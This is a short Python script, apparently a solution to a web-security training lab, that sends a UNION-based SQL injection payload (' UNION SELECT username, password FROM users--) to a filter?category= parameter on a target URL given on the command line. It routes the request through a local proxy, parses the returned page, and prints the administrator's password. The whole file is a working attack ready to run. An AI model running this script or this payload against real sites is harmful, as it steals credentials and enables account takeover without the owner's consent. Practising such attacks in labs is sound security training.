#Get administrator password using query UNION
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
path = 'filter?category='
payload = "' UNION SELECT username, password FROM users--"
user = "administrator"

def sqli_payload(url):
	r = requests.get(url + path + payload, verify=False, proxies=proxies)
	if user in r.text:
		soup = BeautifulSoup(r.text, 'html.parser')
		admin_password = soup.body.find(string=user).parent.findNext('td').contents[0]
		return admin_password
	else:
		return False

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f'\033[31m[-] Usage: {sys.argv[0]} <url>\033[0m')
		print(f'\033[31m[-] Example: {sys.argv[0]} www.example.com\033[0m')
		sys.exit(1)

	try:
		get_admin_password = sqli_payload(url)
		if not get_admin_password:
			print('\033[31m[-] Administrator password unfind!!!\033[0m')
		else:
			print(f'\033[32m[+] Administrator password: {get_admin_password}')
			print(f'\033[32m[+] SQLi successful!\033[0m')
	except KeyboardInterrupt:
		print('\n\033[33m[+] Exited...\033[0m')
